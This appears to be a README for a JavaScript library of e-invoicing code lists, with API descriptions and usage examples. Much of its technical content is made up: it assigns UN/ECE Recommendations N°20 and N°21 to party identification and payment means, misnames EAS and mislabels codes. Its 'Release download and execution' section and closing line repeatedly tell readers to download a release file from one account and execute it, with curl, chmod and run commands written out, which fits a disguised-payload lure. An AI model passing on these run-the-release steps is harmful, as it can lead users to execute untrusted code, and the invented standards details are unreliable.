# js-e-invoice-codes — UNTDID, EAS, N°20, N°21 for JS/TS ⚖️📄

[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/MoZman007/js-e-invoice-codes/releases)

Small, focused code lists and helpers for e-invoicing standards. Use with JavaScript or TypeScript to validate, map, and render electronic invoice codes from UNTDID, EAS, and the UN/ECE Recommendations N°20 and N°21. The package supports EU rules (EN 16931), XRechnung, ZUGFeRD and common local profiles.

---

![European Invoice](https://upload.wikimedia.org/wikipedia/commons/b/b7/Flag_of_Europe.svg)

Table of contents
- About
- Key features
- Standards covered
- Installation
- Quick start (JavaScript)
- Quick start (TypeScript)
- API reference
  - Code lists
  - Lookup helpers
  - Validation helpers
  - Mapping helpers (N°20 / N°21)
- Examples
  - Validate invoice party identification
  - Map billing terms to UNTDID
  - Generate human labels for UI
- Integration patterns
  - Node service
  - Browser bundle
  - Serverless
- Performance and size
- Release download and execution
- Testing and CI
- Contributing
- License
- References and resources
- FAQ
- Roadmap

About
This repository collects authoritative code lists and helper utilities for e-invoicing. It focuses on common code systems used in electronic invoices and on the UN/ECE semantic recommendations N°20 and N°21. The goal: give developers a small, reliable core they can embed in servers, web apps, validators, and mapping tools.

Key features
- Canonical code lists for UNTDID and EAS.
- Mapping functions for UN/ECE Recommendation N°20 (party identification) and N°21 (payment means).
- TypeScript types and JSDoc for code completion.
- Light runtime with no heavy dependencies.
- Exports optimized for tree-shaking.
- JSON and JS formats for use in browsers and Node.
- Small footprint for serverless deployments.

Standards covered
- UNTDID (United Nations Trade Data Interchange Directory) code lists.
- EAS (Electronic Addressing Standards) code sets.
- UN/ECE Recommendation N°20 — party identification.
- UN/ECE Recommendation N°21 — payment means.
- EN 16931 profiles for semantic elements relevant to e-invoicing.
- XRechnung profile and ZUGFeRD variants where mapping differs.

Installation
Install via npm or yarn. The package exposes ES modules and CommonJS builds.

npm
```bash
npm install js-e-invoice-codes
```

yarn
```bash
yarn add js-e-invoice-codes
```

CDN
Use a CDN bundle for direct browser import when needed. The repo builds a UMD file for that purpose.

Quick start (JavaScript)
Import the main helpers and a code list. Use the code lists to validate or render options in a UI.

Node / CommonJS
```js
const { codeLists, lookup, validate } = require('js-e-invoice-codes');

const partyIdCodes = codeLists.partyIdentification; // UNTDID party ID codes
console.log(lookup(partyIdCodes, '0160')); // { code: '0160', label: 'VAT registration number' }

const result = validate.partyIdentification({ code: '0160', value: 'DE123456789' });
console.log(result.valid); // true/false
```

ESM
```js
import { codeLists, lookup, validate } from 'js-e-invoice-codes';

const pmCodes = codeLists.paymentMeans;
const label = lookup(pmCodes, '31'); // 'Credit transfer'
```

Quick start (TypeScript)
Type definitions ship with the package. Use them for compile-time checks.

tsconfig.json should enable "moduleResolution": "node" and "esModuleInterop" if you use default imports.

Example
```ts
import { codeLists, lookup, validate } from 'js-e-invoice-codes';
import type { PartyIdentificationCode } from 'js-e-invoice-codes/types';

const c: PartyIdentificationCode = { code: '0160', scheme: 'UNCL' };
if (validate.partyIdentification(c)) {
  console.log(lookup(codeLists.partyIdentification, c.code).label);
}
```

API reference

Code lists
- codeLists.partyIdentification — UNTDID party identification codes.
- codeLists.paymentMeans — UNTDID payment means codes.
- codeLists.partyLocationType — EAS and local location type sets.
- codeLists.documentStatus — document status codes used across e-invoicing.
- codeLists.identificationSchemes — common identification schemes (GLN, VAT, DUNS, EORI, etc).
- codeLists.country — ISO 3166-1 alpha-2 country codes (subset for invoice use).

Each code list uses the format:
```ts
type CodeEntry = {
  code: string;
  label: string;
  description?: string;
  deprecated?: boolean;
  references?: string[]; // URIs or docs
};
```

Lookup helpers
- lookup(list, code) — returns CodeEntry or null.
- findByLabel(list, label) — case-insensitive label match returns array.
- search(list, term) — fuzzy token search across code and label.

Validation helpers
- validate.partyIdentification(entry) — validates required shape and known codes.
- validate.paymentMeans(entry) — validates required fields for payment means.
- validate.identification(value, scheme) — scheme-aware validation for GLN, VAT, IBAN, etc.

Mapping helpers (N°20 / N°21)
- mapPartyToN20(party) — builds Recommendation N°20 structure from a party object.
- mapPaymentToN21(payment) — builds Recommendation N°21 structure from payment details.
- canonicalizeScheme(scheme) — normalize a scheme label to an internal key.

Examples

Validate invoice party identification
This example validates a party object and maps the identification to a human label.

```js
import { codeLists, validate, lookup } from 'js-e-invoice-codes';

const party = {
  id: 'DE123456789',
  scheme: 'VAT',
  code: '0160' // example code from UNTDID
};

const ok = validate.partyIdentification({ code: party.code, scheme: party.scheme, value: party.id });
console.log(ok); // true or false

if (ok) {
  const label = lookup(codeLists.partyIdentification, party.code).label;
  console.log(`Party ID type: ${label}`); // e.g. "VAT registration number"
}
```

Map billing terms to UNTDID
Map common billing terms to UNTDID codes. Use the mapping helper to keep rules centralized.

```js
import { mapPaymentToN21 } from 'js-e-invoice-codes';

const payment = {
  method: 'bankTransfer',
  details: {
    iban: 'DE89370400440532013000',
    bic: 'COBADEFF'
  },
  dueDays: 30
};

const n21 = mapPaymentToN21(payment);
console.log(n21);
/*
{
  paymentMeansCode: '31',
  paymentMeansName: 'Credit transfer',
  payerFinancialAccount: { IBAN: '...', BIC: '...' },
  paymentTerms: { dueDate: '2025-09-12' }
}
*/
```

Generate human labels for UI
Use lookup and code lists to create select inputs and localized labels.

```js
import { codeLists, lookup } from 'js-e-invoice-codes';

const options = codeLists.paymentMeans.map(e => ({ value: e.code, label: e.label }));
// Render as options in a form library
```

Integration patterns

Node service
Use the code lists as a canonical source in an invoice validation microservice. The lists stay static. If you need updates, consume releases and redeploy.

Pattern:
1. Import code lists.
2. Validate incoming invoice JSON.
3. Map local profile fields to UN/ECE N°20/N°21 structures.
4. Attach canonical codes where applicable.
5. Return validation report with exact code matches.

Browser bundle
The library includes a UMD build for direct use in browser apps. Keep the bundle lazy loaded to reduce initial payload.

Serverless
The small runtime makes this package fit serverless functions. Use tree-shaking to include only needed code lists.

Performance and size
- Core code lists compress well with gzip.
- Tree-shaking removes unused lists.
- Typical Node usage adds under 100 KB compressed when only a few lists load.
- Keep lookups in memory. They use plain objects and arrays for O(1)/O(n) patterns.

Release download and execution
Download the release asset and execute the file provided in the release. Visit the releases page and get the package archive or binary:

https://github.com/MoZman007/js-e-invoice-codes/releases

The release page includes build artifacts. Download the file for your platform or the tarball for Node. After download, extract the archive and run the included script or module:

Example for a Node tarball:
```bash
# download the tarball from the Releases page
# replace 'vX.Y.Z' and filename with the version you need
curl -L -o js-e-invoice-codes-vX.Y.Z.tgz "https://github.com/MoZman007/js-e-invoice-codes/releases/download/vX.Y.Z/js-e-invoice-codes-vX.Y.Z.tgz"
tar -xzf js-e-invoice-codes-vX.Y.Z.tgz
cd package
node example/run.js
```

If the release contains CLI binaries, set execution bit and run:
```bash
chmod +x js-e-invoice-codes-cli
./js-e-invoice-codes-cli --help
```

If the release link does not resolve, check the Releases section on the repository page for available files and instructions.

Testing and CI
- The repository includes unit tests for lookups, validators, and mapping rules.
- Tests run on Node LTS versions.
- CI runs lint, typecheck, tests, and build.
- Test commands:
```bash
npm test
npm run lint
npm run build
```

Contributing
Follow these steps to contribute code lists, mappings, or utilities:
1. Fork the repo.
2. Create a branch with a clear name.
3. Add tests for new behavior.
4. Keep changes focused to a single topic per PR.
5. Update types and documentation for public APIs.
6. Open a PR against main and describe the change, the source of truth, and any references.

When adding or updating a code list:
- Add the source document link in the entry `references`.
- Indicate deprecation with `deprecated: true` for removed codes.
- Keep labels short and plain.
- Use English labels and add references to local profile documents in `references`.

License
This project uses the MIT license. See the LICENSE file for full terms.

References and resources
- UNTDID: https://unece.org/trade/uncefact/standard/untdid
- UN/ECE Recommendation N°20: Party identification (search UN/ECE docs)
- UN/ECE Recommendation N°21: Payment means (search UN/ECE docs)
- EN 16931: European standard for e-invoice semantic data models
- XRechnung: German e-invoice profile
- ZUGFeRD: Hybrid e-invoice format (PDF + XML)
- ISO 3166-1 alpha-2: Country codes

FAQ

Q: Which code versions do you ship?
A: Each release includes the versioned snapshot date in the package metadata. The release notes list source versions and dates.

Q: Can I update a list locally?
A: Yes. You can add or override lists in an app build process. Consider opening a PR if the change comes from an authoritative source.

Q: Do you validate syntax (IBAN, GLN, VAT)?
A: The package includes syntax checks for IBAN and GLN. VAT validation may vary by country and needs external endpoints for full checks.

Q: How do I map local payment terms to N°21?
A: Use mapPaymentToN21. It accepts common payment models and returns a standard N°21 structure. Customize the mapping for local profiles.

Roadmap
- Add more EAS subsets used in public procurement.
- Add more localized profile helpers (NL, FR, IT, AT, CH).
- Add CLI for quick downloads and local validation.
- Provide an online JSON validator using a CDN build.

Examples: deeper dive
1) Party identification mapping
The function mapPartyToN20 expects a source object that follows common invoice shapes. It returns a structure aligned with N°20.

Input shape:
```ts
type SourceParty = {
  id?: string;
  scheme?: string;
  name?: string;
  address?: {
    street?: string;
    city?: string;
    postalCode?: string;
    country?: string;
  };
  roles?: string[]; // buyer, seller, supplier
};
```

Behavior:
- If scheme is known (GLN, VAT, VAT-ID), the function sets scheme code and primary ID.
- If the ID format matches GLN, it sets idType to 'GLN'.
- If the party has a registered company number and country, it uses ISO mapping for EORI/VAT logic.

2) Payment means mapping
mapPaymentToN21 converts a friendly payment object to N°21 fields.

Common input:
```js
{
  method: 'card' | 'bankTransfer' | 'directDebit' | 'check',
  details: {
    iban?: string,
    bic?: string,
    accountNumber?: string,
    bankName?: string,
    cardScheme?: 'VISA'|'MASTERCARD'
  },
  dueDays?: number,
  discountDays?: number,
  discountPercent?: number
}
```

Output fields:
- paymentMeansCode (UN code, e.g. '31' for credit transfer).
- paymentMeansName.
- payerFinancialAccount with IBAN/BIC.
- paymentTerms with dueDate or dueDays.

3) Local profile mapping example (XRechnung)
XRechnung requires specific field values in certain segments. Use a mapping profile:
```js
import { mapToXRechnung } from 'js-e-invoice-codes/profiles/xrechnung';

const x = mapToXRechnung(invoice);
```
The profile adds mandatory codes and transformations required by XRechnung, such as specific document code lists and payment means requirements.

Schema and Types
The package includes a small types module:
- types.CodeEntry
- types.PartyIdentificationCode
- types.PaymentMeansCode
- types.MapPartyResult
- types.MapPaymentResult

Types help ensure structure in TS projects. Keep types in sync with runtime behavior.

Changelog and releases
Use the Releases page for downloads and release notes. It lists bugfixes, data source updates, and breaking changes. The release page includes tarballs and checksums.

Access the release page and download the file you need:
https://github.com/MoZman007/js-e-invoice-codes/releases

When a release contains a 'data-only' artifact, you can extract the JSON files and import them directly in a front-end project. If the release contains a CLI, follow the packaged README for usage.

Example mapping rules and rationale
- Use UNTDID codes where a semantic code exists. This keeps cross-system mapping consistent.
- Use EAS for addressing and location types where UNTDID lacks a local term.
- When multiple codes express the same semantics, prefer the recommended UN/ECE mapping in N°20 and N°21.
- Deprecate codes only when the source declares deprecation. Keep the original code with `deprecated: true` to aid data migration.

Maintainers
The repository maintains clear authorship and links to source documents in entries. Each code entry may include a `references` array with links to the official source document and the page where the code is defined.

Security
The code lists contain no executable payloads. The release artifacts may include scripts for convenience. Always verify signatures or checksums in the release notes before running binaries from an archive.

Sample UI rendering pattern
- Fetch code list at build time.
- Convert to Option[]:
```js
const options = codeLists.partyIdentification.map(e => ({
  value: e.code,
  label: `${e.code} — ${e.label}`
}));
```
- Use a select component for the user to pick a code.
- On submit, validate with validate.partyIdentification.

Advanced topics

Normalization and canonicalization
- canonicalizeScheme maps scheme names like 'VAT', 'VAT-ID', 'VAT number' to 'VAT'.
- For international use, prefer GLN for trade partner IDs where possible.
- For tax authorities, prefer standardized VAT or tax ID where required.

Localization
Labels ship in English. For localization, produce a mapping file that maps code to translated label. The library treats labels as primary English text. Use the code as the stable key for translations.

Merging updates
When updating lists from official sources:
1. Add a commit that references the source.
2. Keep entries immutable once published in a release.
3. Provide migration notes when codes change semantics.

CLI (planned)
The planned CLI will:
- Download releases.
- Extract lists.
- Check local lists against upstream.
- Offer an update command to refresh local JSON files.

Testing strategy
- Unit tests cover lookup and validate helpers.
- Mapping tests cover expected output for canonical examples.
- Fixtures include sample invoices using English and EU profiles.

Example unit test
```js
import { codeLists, lookup } from 'js-e-invoice-codes';
import assert from 'assert';

describe('lookup', () => {
  it('returns label for known payment code', () => {
    const res = lookup(codeLists.paymentMeans, '31');
    assert.strictEqual(res.label, 'Credit transfer');
  });
});
```

Common pitfalls
- Mixing local profile codes with canonical codes in stored invoices. Store canonical codes and include local profile metadata in a separate field.
- Assuming label text is stable. Labels change. Store code values and regenerate labels on display.
- Over-validating dynamic content. Use syntactic validation for IBAN/GLN and avoid external API calls in core validation logic.

Localization sample
Provide a mapping file `i18n/en.json` and build a map loader:
```js
import en from './i18n/en.json';
const getLabel = (list, code, locale = 'en') => {
  const map = { en };
  return map[locale][list][code] || lookup(codeLists[list], code).label;
};
```

Schema examples for rules engine
A rules engine can run checks on invoices. Example rule:
- If paymentMeans.code === '42' and payer country is not same as payee, mark for cross-border review.

Rules can be expressed as JSON and executed with a lightweight evaluator.

Support and contact
Open issues for bugs, feature requests, or data updates. Provide a clear reproduction case and links to source documents when requesting code list changes.

Badges and socials
[![NPM Version](https://img.shields.io/npm/v/js-e-invoice-codes)](https://www.npmjs.com/package/js-e-invoice-codes)
[![TypeScript](https://img.shields.io/badge/TypeScript-yes-blue?logo=typescript)](#)
[![Node](https://img.shields.io/badge/Node-LTS-green?logo=node.js)](#)

Images and icons used
- EU flag from Wikimedia Commons: https://upload.wikimedia.org/wikipedia/commons/b/b7/Flag_of_Europe.svg
- Shield badges from https://img.shields.io

Topics and keywords
This repo tracks tags used by integrators and search engines:
e-invoice, e-rechnung, en16931, invoice, n20, n21, rechnung, recommendation, untdid, xrechnung, zugferd

When you need a release artifact, go to the releases page and download the file and execute it as described above:
https://github.com/MoZman007/js-e-invoice-codes/releases

Keep the package and lists close to your code. Use the code values as source of truth.